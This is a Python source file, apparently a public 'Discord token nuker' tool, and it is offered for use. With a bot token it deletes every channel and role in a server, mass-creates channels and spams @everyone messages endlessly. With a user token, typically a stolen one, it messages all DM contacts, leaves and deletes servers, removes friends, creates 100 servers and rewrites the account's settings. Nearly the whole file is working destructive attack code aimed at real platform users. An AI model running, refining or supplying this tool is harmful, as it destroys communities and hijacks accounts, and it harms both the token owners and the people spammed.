# MIT License
# Copyright (c) 2023 meowistic
# https://github.com/meowistic/discord-token-nuker

# DO NOT DELETE THE FIRST 3 LINES OF THIS CODE!!!


import discord
from discord.ext import commands
from colorama import Fore
import colorama
import requests
import random
from time import sleep
from colorama import Back
import json
import os


colorama.init()




system = os.name
if system == 'nt':

    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(f"Meow's Discord Nuker")

elif system == 'posix':
    import sys

    sys.stdout.write("Meow's Discord Nuker")
else:

    pass


def clear():
    from sys import platform
    if platform == "linux" or platform == "linux2":
        os.system("clear")

    elif platform == "win32":
        os.system("cls")



print(Fore.LIGHTBLUE_EX + rf'''
meow   __  __ _____ _____        ___ ____      _   _ _   _ _  _______ ____    meow
meow  |  \/  | ____/ _ \ \      / ( ) ___|    | \ | | | | | |/ / ____|  _ \   meow
meow  | |\/| |  _|| | | \ \ /\ / /|/\___ \    |  \| | | | | ' /|  _| | |_) |  meow
meow  | |  | | |__| |_| |\ V  V /    ___) |   | |\  | |_| | . \| |___|  _ <   meow
meow  |_|  |_|_____\___/  \_/\_/    |____/    |_| \_|\___/|_|\_\_____|_| \_\  meow

Bot/Account nuker''')
print(Fore.WHITE + """https://github.com/meowistic
""")

try:
    with open("config.json", "r") as f:
        f = json.load(f)
        token = f["token"]

except FileNotFoundError:
    print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)

if token != "":
    tokenm = token[:-50]
    print(Fore.YELLOW + f"[*] Token imported from config [{tokenm + '*' * 50}]")
    pass
else:
    token = input(Fore.LIGHTBLUE_EX + "[?] Enter Your Bot/User Token: ")

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]


def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers


def vtoken(token):
    try:
        with open("config.json", "r") as f:
            f = json.load(f)
            toke = f["token"]
            amount = f["amount"]
            nick = f["nickname"]
            prefix = f["prefix"]
            if amount != "" or prefix != "" or toke != "" or nick != "":
                print(Fore.GREEN + "[+] Config successfully loaded.")
            else:
                pass



    except FileNotFoundError:
        print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)

    url = "https://discord.com/api/v9/users/@me"

    r = requests.get(url, headers=getheaders(token))

    if r.status_code != 200:

        r = requests.get(url, headers=getheaders("Bot " + token))

        if r.status_code != 200:
            print(Fore.RED + f"[-] Token is invalid!.")
            sleep(1)
            exit()


        else:

            print(Fore.YELLOW + "[*] Token Successfully Identified: Bot")

            if prefix != "":
                print(Fore.YELLOW + f"[*] Prefix successfully imported from config, {prefix}meow to start the nuker.")
                pass
            else:
                prefix = input(Fore.LIGHTBLUE_EX + "[?] Enter bot prefix: ")
                print(Fore.YELLOW + f"[*] Prefix successfully set, {prefix}meow to start the nuker.")

            if nick != "":
                pass
            else:
                nick = input(Fore.LIGHTBLUE_EX + "[?] What is your internet nickname (NUKED BY {nickname}): ")

            if amount != "":
                print(Fore.YELLOW + f"[*] Channel amount imported from config ({amount})")

            else:

                while True:
                    try:

                        amount = int(
                            input(Fore.LIGHTBLUE_EX + "[?] Channel Amount (how many channels you'd like to create): "))
                    except ValueError:#ㅤ
                        print(Fore.RED + "[-] Invalid input! It has to be a number.")

                        continue
                    else:

                        break

            amount = int(amount)
            if amount >= 200:
                print(
                    Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: Your channel amount is over 200, which could cause the bot to get ratelimited a lot and the bot being blocked. Proceed with caution." + Back.RESET)

            nick = nick.upper()
            SPAM_CHANNEL = f"nuked by {nick}"
            SPAM_MESSAGE = f"@everyone NUKED BY {nick}", f"@everyone {nick} BEAMED THIS BOT"

            bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

            @bot.event
            async def on_ready():
                await bot.change_presence(activity=discord.watching(name=".help"))
                print(Fore.LIGHTGREEN_EX+"[+] Logged in as " + bot.user.name)
                print(Fore.YELLOW + f"[*] Waiting for command... ({prefix}meow)")

            @bot.command()
            async def stop(ctx):
                await ctx.author.send('> **BOT HAS SHUT DOWN SUCCESSFULLY**')

                exit()

            @bot.command()
            async def pause(ctx):

                print(Fore.YELLOW + "[*] Bot successfully stopped!")
                raise Exception("stopped")#ㅤ

            @bot.command()
            async def resume(ctx):

                guild = ctx.guild

                for channel in guild.channels:
                    try:
                        for i in range(999999999):
                            r = random.choice(SPAM_MESSAGE)
                            await channel.send(r)
                            print(Fore.LIGHTGREEN_EX + f"[+] [+] Successfully spammed message: {r} [x{i}]" + Fore.RESET)
                            clear()

                    except:
                        print(Fore.RED + f"[-] Failed to spam message: {r}" + Fore.RESET)



            @bot.command()
            async def meow(ctx):
                global uid#ㅤ
                uid = ctx.message.author.id
                guild = ctx.guild

                for channel in guild.channels:
                    try:
                        await channel.delete()
                        print(Fore.LIGHTGREEN_EX + f"[+] {channel.name} has been successfully deleted!" + Fore.RESET)
                    except:
                        print(Fore.RED + f"[-] Failed to delete {channel.name}" + Fore.RESET)

                for role in guild.roles:
                    try:
                        await role.delete()
                        print(Fore.LIGHTGREEN_EX + f"[+] Deleted role: {role.name}" + Fore.RESET)
                    except:
                        print(Fore.RED + f"[-] Couldn't delete {role.name}" + Fore.RESET)

                for i in range(amount):
                    await guild.create_text_channel(SPAM_CHANNEL)
                print(Fore.YELLOW + f"[*] {guild.name} has been nuked!")
                return
            x = True
            @bot.event
            async def on_guild_channel_create(channel):

                try:#ㅤ
                    while x:
                        r = random.choice(SPAM_MESSAGE)
                        await channel.send(r)

                        print(Fore.LIGHTGREEN_EX + f"[+] Successfully spammed message: {r}]" + Fore.RESET)

                #TODO instead of closing it, stop the program with an input after exception is raised.

                except Exception:
                        if x:
                            print(
                            Fore.YELLOW + "[*] If you see this message, the exception has been passed and the bot stopped spamming.")
                            input()

            bot.run(token)

    else:
        print(Fore.YELLOW + "[*] Token Successfully Identified: User Account")
        try:
            with open("config.json", "r") as f:
                f = json.load(f)
                nick = f["nick"]

        except FileNotFoundError:
            print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)

        if nick != "":
            pass
        else:
            nick = input(Fore.LIGHTBLUE_EX + "[?] what is your internet nickname (NUKED BY {nickname}): ")

        def nuke(token, Server_Name, message_Content):
            try:
                with open("config.json", "r") as f:
                    f = json.load(f)#ㅤ
                    toke = f["token"]
                    amount = f["amount"]
                    nick = f["nickname"]
                    prefix = f["prefix"]
                    if amount != "" and prefix != "" and toke != "" and nick != "":
                        print(Fore.GREEN + "[+] Config successfully loaded.")
                    else:
                        pass



            except FileNotFoundError:
                print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)

            print(Fore.LIGHTGREEN_EX + "[+] Starting nuke...")

            headers = {'Authorization': token}
            channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
            for channel in channelIds:
                try:
                    requests.post(f'https://discord.com/api/v9/channels/' + channel['id'] + '/messages',
                                  headers=headers,
                                  data={"content": f"{message_Content}"})

                    print(Fore.LIGHTGREEN_EX + "Messaged ID: " + channel['id'])
                except Exception as e:
                    print(Fore.RED + f"[-] Error: {e}")
            print(Fore.LIGHTGREEN_EX + "[+] Sent a Message to every friend...\n")

            guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
            for guild in guildsIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v8/users/@me/guilds/' + guild['id'],
                        headers={'Authorization': token})
                    print(Fore.LIGHTGREEN_EX + "[+] Left server: " + guild['name'])
                except Exception as e:
                    print(Fore.RED + f"[-] Error: {e}")

            for guild in guildsIds:
                try:
                    requests.delete(f'https://discord.com/api/v8/guilds/' + guild['id'],
                                    headers={'Authorization': token})
                    print(Fore.LIGHTGREEN_EX + '[+] Deleted server: ' + guild['name'])
                except Exception as e:
                    print(Fore.RED + f"[-] Error: {e}")
            print(Fore.LIGHTGREEN_EX + "[+] Left and deleted all available servers!\n")

            friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships",
                                     headers=getheaders(token)).json()
            for friend in friendIds:
                try:
                    requests.delete(#ㅤ
                        f'https://discord.com/api/v9/users/@me/relationships/' + friend['id'],
                        headers=getheaders(token))
                    print(f"removed friend: " + friend['user']['username'] + "#" + friend['user'][
                        'discriminator'])
                except Exception as e:
                    print(Fore.RED + f"[-] Error: {e}")
            print(Fore.LIGHTGREEN_EX + f"[+] All friends removed!")

            for i in range(100):
                try:
                    payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
                    requests.post('https://discord.com/api/v7/guilds', headers=getheaders(token), json=payload)
                    print(Fore.LIGHTGREEN_EX + f"[+] Created {Server_Name} ({i})")
                except Exception as e:
                    print(Fore.RED + f"[-] Error: {e}")
            print(Fore.LIGHTGREEN_EX + f"[+] Created all servers succesfully! (100 servers in total)\n")
            requests.delete("https://discord.com/api/v8/hypesquad/online", headers=getheaders(token))
            print(Fore.LIGHTGREEN_EX + "[+] Deleted HypeSquad")
            setting = {
                'theme': "light",
                'locale': "cz",
                'message_display_compact': False,
                'inline_embed_media': False,
                'inline_attachment_media': False,
                'gif_auto_play': False,
                'render_embeds': False,
                'render_reactions': False,
                'animate_emoji': False,
                'convert_emoticons': False,#ㅤ
                'enable_tts_command': False,
                'explicit_content_filter': '0',
                "custom_status": {"text": f"https://github.com/meowistic/discord-token-nuker"},
                'status': "idle"
            }
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token),
                           json=setting)
            j = requests.get("https://discordapp.com/api/v9/users/@me", headers=getheaders(token)).json()
            a = j['username'] + "#" + j['discriminator']
            print(Fore.LIGHTGREEN_EX + f"[+] Succesfully nuked {a} ")
            input()
            exit()

        Server_Name = f"{nick} ON TOP"

        message_Content = str(input(#ㅤ
            Fore.LIGHTBLUE_EX + "[?] Message to send to the user's friends: "))

        nuke(token=token, Server_Name=Server_Name, message_Content=message_Content)


vtoken(token)
